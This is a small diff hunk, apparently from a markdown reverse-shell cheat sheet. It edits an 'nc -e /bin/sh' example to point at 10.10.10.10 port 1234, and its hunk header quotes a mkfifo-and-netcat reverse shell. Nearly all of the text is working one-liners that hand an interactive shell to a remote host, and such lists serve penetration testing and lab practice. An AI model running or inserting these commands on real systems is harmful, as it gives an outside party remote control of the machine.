@@ -9,7 +9,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 
 Netcat with -e
 ```bash
-nc -e /bin/sh 10.0.0.1 1234
+nc -e /bin/sh 10.10.10.10 1234
 ```
 
 ## Bash
